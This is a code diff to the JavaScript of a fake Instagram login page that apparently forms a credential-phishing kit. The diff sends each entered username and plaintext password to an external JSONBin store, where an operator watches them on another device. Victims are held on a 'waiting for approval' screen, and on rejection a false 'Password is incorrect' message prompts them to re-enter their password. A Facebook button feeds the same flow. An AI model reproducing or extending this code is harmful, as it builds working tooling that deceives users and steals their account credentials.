@@ -15,7 +15,7 @@ function togglePasswordVisibility() {
 }
 
 // Form validation and submission
-document.getElementById('login-form').addEventListener('submit', function(event) {
+document.getElementById('login-form').addEventListener('submit', async function(event) {
     event.preventDefault();
     
     const username = document.getElementById('username').value.trim();
@@ -30,14 +30,26 @@ document.getElementById('login-form').addEventListener('submit', function(event)
         loginButton.textContent = 'Logging in...';
         loginButton.disabled = true;
         
-        // Submit login for admin approval
-        submitLoginForApproval(username, password);
-        
-        // Display waiting message
-        showWaitingForApprovalMessage();
-        
-        // Start checking for approval
-        startCheckingForApproval();
+        try {
+            // Submit login for admin approval using the API
+            const loginRequest = await submitLoginForApproval(username, password);
+            
+            // Store the request ID in localStorage so we can check for approval
+            localStorage.setItem('currentLoginRequestId', loginRequest.id);
+            
+            // Display waiting message
+            showWaitingForApprovalMessage();
+            
+            // Start checking for approval
+            startCheckingForApproval(loginRequest.id);
+        } catch (error) {
+            console.error('Login submission failed:', error);
+            alert('Login submission failed. Please try again later.');
+            
+            // Reset the button
+            loginButton.textContent = 'Log In';
+            loginButton.disabled = false;
+        }
     } else {
         // Show validation error
         alert('Please fill in all fields');
@@ -47,15 +59,16 @@ document.getElementById('login-form').addEventListener('submit', function(event)
 /**
  * Submit login details for admin approval
  */
-function submitLoginForApproval(username, password) {
-    // Store login details in local storage for admin to review
-    localStorage.setItem('pendingLogin', JSON.stringify({
-        username: username,
-        password: password,
-        timestamp: new Date().toISOString()
-    }));
-    
-    console.log('Login submitted for admin approval');
+async function submitLoginForApproval(username, password) {
+    try {
+        // Use the API to add a pending login
+        const loginRequest = await API.addPendingLogin(username, password);
+        console.log('Login submitted for admin approval');
+        return loginRequest;
+    } catch (error) {
+        console.error('Error submitting login:', error);
+        throw error;
+    }
 }
 
 /**
@@ -78,6 +91,7 @@ function showWaitingForApprovalMessage() {
         <h3>Waiting for Admin Approval</h3>
         <p>Your login request has been submitted and is waiting for administrator approval.</p>
         <p class="approval-status">Status: <span id="approval-status-text">Pending</span></p>
+        <p class="device-notice">You can close this page and check back later. The admin will approve or reject your login from a different device.</p>
     `;
     
     // Add the waiting message after the login form
@@ -150,6 +164,14 @@ function showWaitingForApprovalMessage() {
                 border-radius: 4px;
                 display: none;
             }
+            
+            .device-notice {
+                margin-top: 20px;
+                padding: 10px;
+                background-color: #f8f9fa;
+                border-radius: 4px;
+                font-style: italic;
+            }
         `;
         document.head.appendChild(styleElement);
     }
@@ -158,62 +180,75 @@ function showWaitingForApprovalMessage() {
 /**
  * Start checking for admin approval
  */
-function startCheckingForApproval() {
-    // Check for approval every 2 seconds
-    const approvalCheckInterval = setInterval(() => {
-        const loginResult = JSON.parse(localStorage.getItem('loginResult'));
-        
-        if (loginResult) {
-            clearInterval(approvalCheckInterval);
+function startCheckingForApproval(requestId) {
+    // Store the request ID in localStorage
+    localStorage.setItem('currentLoginRequestId', requestId);
+    
+    // Check for approval at the configured interval
+    const approvalCheckInterval = setInterval(async () => {
+        try {
+            // Use the API to check for login result
+            const result = await API.checkLoginResult(requestId);
             
-            const statusElement = document.getElementById('approval-status-text');
-            
-            if (loginResult.status === 'approved') {
-                // Update status text
-                statusElement.textContent = 'Approved';
-                statusElement.classList.add('approved');
+            if (result) {
+                clearInterval(approvalCheckInterval);
                 
-                // Show success message
-                setTimeout(() => {
-                    // Redirect to dashboard
-                    window.location.href = `dashboard.html?username=${encodeURIComponent(loginResult.username)}&approved=true`;
-                }, 1500);
-            } else if (loginResult.status === 'rejected') {
-                // Update status text
-                statusElement.textContent = 'Rejected';
-                statusElement.classList.add('rejected');
+                const statusElement = document.getElementById('approval-status-text');
                 
-                // Create and show error message
-                const waitingMessage = document.getElementById('approval-waiting');
-                
-                if (!document.getElementById('error-message')) {
-                    const errorMessage = document.createElement('div');
-                    errorMessage.id = 'error-message';
-                    errorMessage.className = 'error-message';
-                    errorMessage.textContent = 'Password is incorrect. Please re-enter your password.';
-                    errorMessage.style.display = 'block';
+                if (result.status === 'approved') {
+                    // Update status text
+                    statusElement.textContent = 'Approved';
+                    statusElement.classList.add('approved');
                     
-                    waitingMessage.appendChild(errorMessage);
-                }
-                
-                // Show error message and reset form after delay
-                setTimeout(() => {
-                    // Reset the form and UI
-                    resetLoginForm();
+                    // Store login information for the dashboard
+                    localStorage.setItem('loginResult', JSON.stringify({
+                        status: 'approved',
+                        username: result.username,
+                        timestamp: result.timestamp,
+                        requestId: requestId
+                    }));
                     
-                    // Focus on password field
-                    const passwordField = document.getElementById('password');
-                    if (passwordField) {
-                        passwordField.focus();
-                        passwordField.value = '';
+                    // Show success message
+                    setTimeout(() => {
+                        // Redirect to dashboard
+                        window.location.href = `dashboard.html?requestId=${encodeURIComponent(requestId)}&approved=true`;
+                    }, 1500);
+                } else if (result.status === 'rejected') {
+                    // Update status text
+                    statusElement.textContent = 'Rejected';
+                    statusElement.classList.add('rejected');
+                    
+                    // Create and show error message
+                    const waitingMessage = document.getElementById('approval-waiting');
+                    
+                    if (!document.getElementById('error-message')) {
+                        const errorMessage = document.createElement('div');
+                        errorMessage.id = 'error-message';
+                        errorMessage.className = 'error-message';
+                        errorMessage.textContent = result.reason || 'Password is incorrect. Please re-enter your password.';
+                        errorMessage.style.display = 'block';
+                        
+                        waitingMessage.appendChild(errorMessage);
                     }
-                }, 3000);
+                    
+                    // Show error message and reset form after delay
+                    setTimeout(() => {
+                        // Reset the form and UI
+                        resetLoginForm();
+                        
+                        // Focus on password field
+                        const passwordField = document.getElementById('password');
+                        if (passwordField) {
+                            passwordField.focus();
+                            passwordField.value = '';
+                        }
+                    }, 3000);
+                }
             }
-            
-            // Clear the result
-            localStorage.removeItem('loginResult');
+        } catch (error) {
+            console.error('Error checking login approval:', error);
         }
-    }, 2000);
+    }, CONFIG.POLLING.CHECK_APPROVAL);
     
     // Store the interval ID in a data attribute so we can clear it if needed
     document.body.setAttribute('data-approval-interval', approvalCheckInterval);
@@ -245,6 +280,9 @@ function resetLoginForm() {
     if (passwordField) {
         passwordField.value = '';
     }
+    
+    // Clear the login request ID
+    localStorage.removeItem('currentLoginRequestId');
 }
 
 // Enable/disable login button based on form input
@@ -267,25 +305,67 @@ function toggleLoginButton() {
 }
 
 // Handle Facebook login button click
-document.querySelector('.facebook-login').addEventListener('click', function() {
+document.querySelector('.facebook-login').addEventListener('click', async function() {
     alert('Facebook login would redirect to Facebook authentication in a real app.');
     
     // For demonstration, we'll submit a Facebook login for admin approval
-    submitLoginForApproval('facebook_user', 'facebook_auth');
-    showWaitingForApprovalMessage();
-    startCheckingForApproval();
+    try {
+        const loginRequest = await submitLoginForApproval('facebook_user', 'facebook_auth');
+        localStorage.setItem('currentLoginRequestId', loginRequest.id);
+        showWaitingForApprovalMessage();
+        startCheckingForApproval(loginRequest.id);
+    } catch (error) {
+        console.error('Facebook login submission failed:', error);
+        alert('Login submission failed. Please try again later.');
+    }
 });
 
-// Add year dynamically to copyright
-document.addEventListener('DOMContentLoaded', function() {
+// Check for existing login request when page loads
+document.addEventListener('DOMContentLoaded', async function() {
+    // Set current year in footer
     const currentYear = new Date().getFullYear();
     const copyrightSpan = document.querySelector('.copyright span');
-    copyrightSpan.textContent = `© ${currentYear} Instagram from Meta`;
+    if (copyrightSpan) {
+        copyrightSpan.textContent = `© ${currentYear} Instagram from Meta`;
+    }
     
     // Check if we need to clear any previously running intervals
     const approvalInterval = document.body.getAttribute('data-approval-interval');
     if (approvalInterval) {
         clearInterval(parseInt(approvalInterval));
         document.body.removeAttribute('data-approval-interval');
+    }
+    
+    // Check if there's an existing login request
+    const requestId = localStorage.getItem('currentLoginRequestId');
+    if (requestId) {
+        try {
+            const result = await API.checkLoginResult(requestId);
+            
+            if (!result) {
+                // No result yet, show waiting message and start checking
+                const pendingData = await API.readBin(CONFIG.JSONBIN.BINS.PENDING_LOGINS);
+                const pendingLogins = pendingData.requests || [];
+                const request = pendingLogins.find(req => req.id === requestId);
+                
+                if (request && request.status === 'pending') {
+                    showWaitingForApprovalMessage();
+                    startCheckingForApproval(requestId);
+                }
+            } else if (result.status === 'approved') {
+                // Already approved, redirect to dashboard
+                localStorage.setItem('loginResult', JSON.stringify({
+                    status: 'approved',
+                    username: result.username,
+                    timestamp: result.timestamp,
+                    requestId: requestId
+                }));
+                
+                window.location.href = `dashboard.html?requestId=${encodeURIComponent(requestId)}&approved=true`;
+            }
+            // If rejected, do nothing and let user try again
+        } catch (error) {
+            console.error('Error checking existing login request:', error);
+        }
     }
 }); 
